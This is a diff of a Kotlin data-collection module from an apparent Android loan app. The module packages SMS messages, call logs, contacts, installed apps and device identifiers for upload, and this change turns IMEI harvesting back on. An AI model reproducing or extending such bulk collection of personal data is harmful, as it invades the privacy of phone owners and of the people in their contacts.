@@ -1,14 +1,18 @@
 package com.loan.icreditapp.collect
 
+import android.Manifest
 import android.annotation.SuppressLint
 import android.content.Context
 import android.content.pm.ApplicationInfo
+import android.content.pm.PackageManager
 import android.database.Cursor
 import android.net.Uri
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.text.TextUtils
 import android.util.Log
+import androidx.core.app.ActivityCompat
+import com.alibaba.fastjson.JSON
 import com.blankj.utilcode.util.*
 import com.blankj.utilcode.util.ThreadUtils.SimpleTask
 import com.drojian.alpha.toolslib.log.LogSaver
@@ -86,6 +90,7 @@ class CollectDataMgr {
     }
 
 
+    @SuppressLint("MissingPermission")
     private fun buildRequestJsonObj(
         smsStr: String, callRecordStr: String,
         contractStr: String, appListStr: String,
@@ -118,8 +123,15 @@ class CollectDataMgr {
             //公网IP
             jsonObject.put("pubIp", NetworkUtils.getIpAddressByWifi())
             //手机IMEI
-//            jsonObject.put("imei",  PhoneUtils.getIMEI())
-            jsonObject.put("imei", "")
+            try {
+                val hasPermissionReadPhoneState =
+                    PermissionUtils.isGranted(Manifest.permission.READ_PHONE_STATE)
+                if (hasPermissionReadPhoneState) {
+                    jsonObject.put("imei", PhoneUtils.getIMEI())
+                }
+            } catch (e :Exception){
+
+            }
             //androidId
             jsonObject.put("androidId", DeviceUtils.getAndroidID())
             jsonObject.put("deviceUniqId", DeviceUtils.getUniqueDeviceId())
@@ -289,7 +301,7 @@ class CollectDataMgr {
                     )
                     if (authBean != null && authBean?.hasUpload == true) {
                         observer?.success(response)
-                        log2File(originSms, originContract, originAppInfo, "")
+//                        log2File(originSms, originContract, originAppInfo, "")
                     } else {
                         var errorMsg: String? = null
                         try {
